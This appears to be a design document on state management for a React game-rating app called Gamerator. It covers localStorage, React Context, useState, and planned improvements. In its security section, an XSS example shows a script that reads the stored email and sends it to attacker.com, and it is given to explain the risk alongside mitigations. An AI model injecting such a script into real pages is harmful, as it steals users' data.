# State Management

## Overview

Gamerator uses a lightweight state management approach combining React's built-in state mechanisms (useState, Context API) with browser localStorage for persistence. This architecture avoids heavy state management libraries like Redux, keeping the application simple while meeting all functional requirements.

---

## State Architecture Layers

```
┌────────────────────────────────────────────────────────────┐
│                    STATE ARCHITECTURE                       │
├────────────────────────────────────────────────────────────┤
│                                                             │
│  Layer 1: Persistent State (localStorage)                  │
│  ┌──────────────────────────────────────────────────────┐ │
│  │  Browser localStorage                                 │ │
│  │  - loginState: "true" | "false"                       │ │
│  │  - userId: email string | "null"                      │ │
│  │  Survives: Page refresh, browser restart             │ │
│  └──────────────────────────────────────────────────────┘ │
│                          ↕                                  │
│  Layer 2: Global State (React Context)                     │
│  ┌──────────────────────────────────────────────────────┐ │
│  │  UserEmail Context                                    │ │
│  │  - userId: string                                     │ │
│  │  - setUserId: function                                │ │
│  │  Shared: Navbar, GameCardPopup                        │ │
│  └──────────────────────────────────────────────────────┘ │
│                          ↕                                  │
│  Layer 3: Component State (useState)                       │
│  ┌──────────────────────────────────────────────────────┐ │
│  │  Local to individual components                       │ │
│  │  - App: login, userId                                 │ │
│  │  - GameCardContainer: games[]                         │ │
│  │  - Leaderboard: topGames{}                            │ │
│  │  - GameCardPopup: rating                              │ │
│  │  Scope: Single component + children                   │ │
│  └──────────────────────────────────────────────────────┘ │
│                          ↕                                  │
│  Layer 4: Server State (No Cache)                          │
│  ┌──────────────────────────────────────────────────────┐ │
│  │  Data fetched from backend API                        │ │
│  │  - Games by category                                  │ │
│  │  - Leaderboard data                                   │ │
│  │  - Vote eligibility                                   │ │
│  │  No caching, always fresh                             │ │
│  └──────────────────────────────────────────────────────┘ │
│                                                             │
└────────────────────────────────────────────────────────────┘
```

---

## localStorage (Persistent State)

### Storage Schema

**Key-Value Pairs**:
```javascript
{
  "loginState": "true",              // Authentication status
  "userId": "john.doe@gmail.com"     // User identifier
}
```

### Write Operations

**Location: FrontPage.js (After OAuth Success)**
```javascript
const responseGoogle = (response) => {
  const userEmail = response.profileObj.email

  // Write to localStorage
  localStorage.setItem("userId", userEmail)
  localStorage.setItem("loginState", "true")

  navigate("/home")
}
```

**Location: Navbar.js (Logout)**
```javascript
const logout = () => {
  localStorage.clear()  // Remove all items
  navigate("/")
  window.location.reload()
}
```

### Read Operations

**Location: App.js (Initialization)**
```javascript
const [login, setLogin] = useState(
  localStorage.getItem("loginState") || "false"
)

const [userId, setUserId] = useState(
  localStorage.getItem("userId") || "null"
)
```

**Timing**:
- Read on App.js mount (page load/refresh)
- Not reactive (doesn't update when localStorage changes)
- Requires page reload or component remount to sync

### Limitations

1. **Size Limit**: ~5-10MB per domain (browser-dependent)
2. **Synchronous API**: Blocks main thread (negligible for small data)
3. **String-Only**: Must JSON.stringify/parse for objects
4. **No Expiration**: Data persists forever unless manually cleared
5. **XSS Vulnerable**: Accessible to any JavaScript on the page
6. **Single Tab Issues**: Changes in one tab don't notify other tabs

### Security Considerations

**Current Risk Level: Medium**

**What's Stored**:
- User email: Not sensitive (already visible in UI)
- Login state: Just a boolean flag

**What's NOT Stored** (good):
- OAuth tokens
- Passwords
- Payment information

**Potential Attacks**:
```javascript
// XSS attack example
<script>
  const email = localStorage.getItem('userId')
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ email })
  })
</script>
```

**Mitigations**:
- React's XSS protection (auto-escaping)
- Content Security Policy headers
- Regular dependency updates (npm audit)

---

## React Context API (Global State)

### Context Definition

**Location: App.js**
```javascript
import { createContext } from 'react'

// Create context (default value: undefined)
export const UserEmail = createContext()
```

### Provider Setup

**Location: App.js**
```javascript
function App() {
  const [userId, setUserId] = useState(
    localStorage.getItem("userId") || "null"
  )

  return (
    <UserEmail.Provider value={{ userId, setUserId }}>
      <Routes>
        {/* ... routes */}
      </Routes>
    </UserEmail.Provider>
  )
}
```

**Provided Value**:
```javascript
{
  userId: string,        // Current user's email
  setUserId: function    // Function to update userId
}
```

**Scope**: All components within Routes (entire app)

### Consumers

**1. Navbar.js (Display User Email)**
```javascript
import { useContext } from 'react'
import { UserEmail } from './App'

function Navbar() {
  const UserContext = useContext(UserEmail)
  const loggedinUserEmail = UserContext.userId

  return (
    <p>Welcome, {loggedinUserEmail}</p>
  )
}
```

**2. GameCardPopup.js (Vote Submission)**
```javascript
import { useContext } from 'react'
import { UserEmail } from './App'

function GameCardPopup({ gameId }) {
  const UserContext = useContext(UserEmail)
  const loggedinUserId = UserContext.userId

  const handleRating = (rating) => {
    // Check vote eligibility using userId
    fetch(`http://.../user/${loggedinUserId}/${gameId}`, {
      method: "PUT"
    })
    // ...
  }
}
```

### Context vs Props

**Why Context is Used**:
- Avoids prop drilling through Header, Navbar, GameCard, etc.
- UserEmail needed deep in component tree (GameCardPopup)
- Global data (user info) shared across many components

**When Props Would Be Better**:
- Component-specific data (game details passed to GameCard)
- Data flowing down one or two levels
- Data that changes frequently (causes re-renders)

### Context Performance Implications

**Current Impact**: Minimal
- Context value changes rarely (only on login/logout)
- Few consumers (just Navbar and GameCardPopup)
- No performance issues

**Potential Issue**:
```javascript
// If context value was created inline:
<UserEmail.Provider value={{ userId, setUserId }}>
  {/* New object on every render! */}
</UserEmail.Provider>
```

**Current Code** (good):
```javascript
// value object is stable (useState returns same setter function)
<UserEmail.Provider value={{ userId, setUserId }}>
```

### Context Synchronization Issue

**Problem**: Context and localStorage can desync

**Scenario**:
1. User logs in
2. FrontPage writes to localStorage
3. FrontPage navigates to /home
4. App.js doesn't re-mount (already mounted)
5. Context still has old value from initialization

**Current Mitigation**: Page reload on logout forces App.js remount

**Better Solution**:
```javascript
// FrontPage.js
import { useContext } from 'react'
import { UserEmail } from './App'

const UserContext = useContext(UserEmail)

const responseGoogle = (response) => {
  const userEmail = response.profileObj.email

  // Update both localStorage and Context
  localStorage.setItem("userId", userEmail)
  localStorage.setItem("loginState", "true")

  UserContext.setUserId(userEmail)  // Sync context

  navigate("/home")
}
```

---

## Component State (useState)

### App.js State

**Purpose**: Authentication state for route protection

```javascript
const [login, setLogin] = useState(
  localStorage.getItem("loginState") || "false"
)

const [userId, setUserId] = useState(
  localStorage.getItem("userId") || "null"
)
```

**Usage**:
- Conditional rendering in routes
- Initial value from localStorage
- Never updated after initialization (relies on remounts)

**Issue**: Stale state if localStorage updated without remount

### GameCardContainer State

**Purpose**: Store fetched games for current category

```javascript
// GameCardContainer.js
const [games, setGames] = useState([])

useEffect(() => {
  fetch(`http://.../action/limit=24`)
    .then(res => res.json())
    .then(data => setGames(data))
}, [gameType])
```

**Lifecycle**:
1. Initialize as empty array
2. Fetch data on mount or gameType change
3. Update state with fetched games
4. Trigger re-render
5. GameCards render

**Data Flow**:
```
GameCardContainer (games state)
        ↓ (map & props)
GameCard components (receive game data as props)
        ↓ (props)
GameCardPopup (receives same game data)
```

### Leaderboard State

**Purpose**: Store top-rated games by category

```javascript
// Leaderboard.js
const [topGames, setTopGames] = useState({})

useEffect(() => {
  fetch(`http://.../leaderboard`)
    .then(res => res.json())
    .then(data => setTopGames(data))
}, [])
```

**Data Structure**:
```javascript
{
  action: [
    { name: "Game 1", metacritic: 85, our_rating: 4.5 },
    { name: "Game 2", metacritic: 90, our_rating: 4.8 },
  ],
  adventure: [...],
  indie: [...],
  shooter: [...],
  rpg: [...]
}
```

**Rendering**:
```javascript
Object.keys(topGames).map(category =>
  // Render category section
  topGames[category].map(game =>
    // Render game item
  )
)
```

### GameCardPopup State

**Purpose**: Track user's star rating selection (currently not used effectively)

```javascript
// GameCardPopup.js
const [rating, setRating] = useState(0)

// Star click handler
<img
  src={Star5}
  alt="5 stars"
  onClick={() => handleRating(5)}  // Doesn't call setRating
/>
```

**Issue**: `rating` state is set but never used
- Should track user's selection
- Should disable stars after voting
- Should provide visual feedback

**Recommended Fix**:
```javascript
const [rating, setRating] = useState(0)
const [hasVoted, setHasVoted] = useState(false)

const handleRating = (starRating) => {
  setRating(starRating)  // Update state immediately

  fetch(`http://.../user/${userId}/${gameId}`, { method: "PUT" })
    .then(res => res.json())
    .then(canVote => {
      if (canVote) {
        return fetch(`http://.../${gameId}/${starRating}`, { method: "PUT" })
      } else {
        setRating(0)  // Revert
        throw new Error("Already voted")
      }
    })
    .then(() => {
      setHasVoted(true)
      alert("Thank you for voting!")
    })
    .catch(error => {
      alert(error.message)
    })
}

// Render stars with state
<img
  src={rating >= 5 ? FilledStar5 : Star5}
  alt="5 stars"
  onClick={() => !hasVoted && handleRating(5)}
  style={{ cursor: hasVoted ? 'not-allowed' : 'pointer' }}
/>
```

---

## State Update Patterns

### Pattern 1: Direct State Update

**Used for**: Simple primitive values

```javascript
const [count, setCount] = useState(0)

// Direct update
setCount(5)
```

### Pattern 2: Functional Update

**Used for**: Updates based on previous state

```javascript
const [count, setCount] = useState(0)

// Functional update (safer for async)
setCount(prevCount => prevCount + 1)
```

**Why it matters**:
```javascript
// Bad: Race condition
onClick={() => {
  setCount(count + 1)
  setCount(count + 1)  // Both read same 'count' value
}}
// Result: count + 1 (not count + 2)

// Good: No race condition
onClick={() => {
  setCount(prev => prev + 1)
  setCount(prev => prev + 1)  // Reads updated value
}}
// Result: count + 2
```

### Pattern 3: Object State Update

**Used for**: Complex state objects

```javascript
const [user, setUser] = useState({ name: '', email: '', age: 0 })

// Update single property (must spread existing state)
setUser(prevUser => ({
  ...prevUser,
  email: 'new@email.com'
}))
```

**Not Used in Gamerator**: All state is primitive or arrays

### Pattern 4: Array State Update

**Used in**: GameCardContainer

```javascript
const [games, setGames] = useState([])

// Replace entire array (current approach)
setGames(newGames)

// Add item (immutable)
setGames(prevGames => [...prevGames, newGame])

// Update item (immutable)
setGames(prevGames =>
  prevGames.map(game =>
    game.id === updatedGame.id ? updatedGame : game
  )
)

// Remove item (immutable)
setGames(prevGames =>
  prevGames.filter(game => game.id !== removedGameId)
)
```

---

## State Derivation

### Derived State (Not Stored)

**Good Practice**: Compute values from existing state instead of duplicating

**Example in Navbar** (could be improved):
```javascript
// Current: Display raw email
const loggedinUserEmail = UserContext.userId

// Could derive display name
const displayName = loggedinUserEmail.split('@')[0]  // "john.doe"
```

**Example in GameCardContainer** (potential):
```javascript
const [games, setGames] = useState([])

// Derive filtered/sorted games (don't store separately)
const sortedGames = useMemo(() =>
  games.sort((a, b) => b.metacritic - a.metacritic),
  [games]
)
```

**Why Derivation is Better**:
- Single source of truth
- No synchronization issues
- Less state to manage
- More predictable

---

## State Lifting

### Current Examples

**GameCard → GameCardPopup**:
```javascript
// GameCard.js
<GameCard
  gameId={game.id}
  name={game.name}
  // ... all game data as props
/>

// Inside GameCard
<GameCardPopup
  gameId={gameId}
  name={name}
  // ... all props passed down
/>
```

**Issue**: Props passed through multiple levels (prop drilling)

**Why Not Lifted**: Game data specific to each card, not global

### When to Lift State

**Lift state when**:
1. Multiple components need to share data
2. Parent needs to control child state
3. Siblings need to communicate

**Don't lift state when**:
1. Data is local to one component
2. No sharing needed
3. Would cause unnecessary re-renders of parent

---

## State vs Server Data

### Current Approach: No Distinction

**All fetched data stored in component state**:
- GameCardContainer.games
- Leaderboard.topGames

**Issues**:
1. No caching (refetch on every navigation)
2. No stale data handling
3. No loading states
4. No error states
5. No optimistic updates

### Recommended: Separate Server State

**Using React Query (TanStack Query)**:
```javascript
// GameCardContainer.js
import { useQuery } from 'react-query'

function GameCardContainer({ gameType }) {
  const { data: games, isLoading, error } = useQuery(
    ['games', gameType],
    () => fetch(`http://.../action/limit=24`).then(res => res.json()),
    {
      staleTime: 5 * 60 * 1000,  // 5 minutes
      cacheTime: 10 * 60 * 1000, // 10 minutes
    }
  )

  if (isLoading) return <LoadingSpinner />
  if (error) return <ErrorMessage error={error} />

  return (
    <div className="gameCardContainer">
      {games.map(game => <GameCard key={game.id} {...game} />)}
    </div>
  )
}
```

**Benefits**:
- Automatic caching
- Loading and error states
- Automatic refetching
- Optimistic updates
- Request deduplication
- Pagination support

---

## State Debugging

### Current Tools

**React DevTools**:
- Inspect component state and props
- View Context values
- Track state changes

**localStorage Inspection**:
```javascript
// Console
localStorage.getItem('loginState')  // "true"
localStorage.getItem('userId')      // "john.doe@gmail.com"

// DevTools: Application tab → Local Storage
```

### Debugging Patterns

**Log State Changes**:
```javascript
const [games, setGames] = useState([])

useEffect(() => {
  console.log('Games updated:', games)
}, [games])
```

**Track Context Updates**:
```javascript
function Navbar() {
  const UserContext = useContext(UserEmail)

  useEffect(() => {
    console.log('UserContext changed:', UserContext.userId)
  }, [UserContext.userId])
}
```

**Validate State**:
```javascript
useEffect(() => {
  if (games.length === 0) {
    console.warn('No games loaded')
  }
}, [games])
```

---

## State Management Best Practices

### Currently Following

✅ **Use Built-in Hooks**: useState, useContext (no unnecessary libraries)
✅ **Minimize Global State**: Only user email in Context
✅ **Immutable Updates**: Always replace state, never mutate
✅ **Co-located State**: State lives close to where it's used

### Currently Missing

❌ **Separation of Concerns**: Server state mixed with UI state
❌ **Error Handling**: No error state for failed fetches
❌ **Loading States**: No loading indicators
❌ **Optimistic Updates**: No immediate UI feedback for votes
❌ **State Validation**: No type checking (PropTypes or TypeScript)

---

## Recommended Improvements

### Short-Term (High Impact)

**1. Add Loading and Error States**:
```javascript
const [games, setGames] = useState([])
const [loading, setLoading] = useState(true)
const [error, setError] = useState(null)

useEffect(() => {
  setLoading(true)
  setError(null)

  fetch(url)
    .then(res => res.json())
    .then(data => {
      setGames(data)
      setLoading(false)
    })
    .catch(err => {
      setError(err)
      setLoading(false)
    })
}, [gameType])
```

**2. Sync Context with localStorage**:
```javascript
// FrontPage.js
const UserContext = useContext(UserEmail)

const responseGoogle = (response) => {
  const userEmail = response.profileObj.email

  localStorage.setItem("userId", userEmail)
  UserContext.setUserId(userEmail)  // Sync immediately

  navigate("/home")
}
```

**3. Add PropTypes for Type Safety**:
```javascript
import PropTypes from 'prop-types'

GameCard.propTypes = {
  gameId: PropTypes.number.isRequired,
  name: PropTypes.string.isRequired,
  img: PropTypes.string,
  // ... all props
}
```

### Long-Term (Production-Ready)

**1. Migrate to React Query**:
- Separate server state from UI state
- Automatic caching and refetching
- Better loading and error handling

**2. TypeScript Migration**:
- Type safety for all state
- Catch bugs at compile time
- Better IDE autocomplete

**3. Custom Hooks for State Logic**:
```javascript
// useAuth.js
export function useAuth() {
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    const userId = localStorage.getItem('userId')
    const loginState = localStorage.getItem('loginState')

    if (loginState === 'true' && userId) {
      setUser({ email: userId })
    }

    setLoading(false)
  }, [])

  const login = (email) => {
    localStorage.setItem('userId', email)
    localStorage.setItem('loginState', 'true')
    setUser({ email })
  }

  const logout = () => {
    localStorage.clear()
    setUser(null)
  }

  return { user, loading, login, logout }
}

// Usage
const { user, loading, login, logout } = useAuth()
```

---

## State Management Comparison

### Current (React Hooks + Context)

**Pros**:
- Simple, no extra dependencies
- Easy to understand
- Sufficient for current needs
- Fast development

**Cons**:
- No built-in caching
- Manual loading/error states
- Prop drilling for non-context state
- No dev tools

### Redux (Not Used)

**Pros**:
- Centralized state
- Time-travel debugging
- Middleware (logging, persistence)
- Large ecosystem

**Cons**:
- Significant boilerplate
- Steep learning curve
- Overkill for this app
- Slower development

### React Query (Recommended)

**Pros**:
- Specialized for server state
- Automatic caching
- Built-in loading/error states
- Optimistic updates
- Small learning curve

**Cons**:
- Additional dependency
- Different mental model
- Requires refactoring

---

## Conclusion

Gamerator's state management strategy is appropriate for its scale and complexity. The use of React's built-in state mechanisms keeps the codebase simple and maintainable. However, the current approach doesn't distinguish between UI state and server state, leading to manual cache management and missing loading/error states.

**Current State**: Simple, functional, easy to understand
**Production-Ready State**: Needs server state library (React Query), better error handling, TypeScript

For a learning project, the current approach effectively demonstrates React state fundamentals. For production, adopting React Query would significantly improve user experience and developer productivity with minimal added complexity.
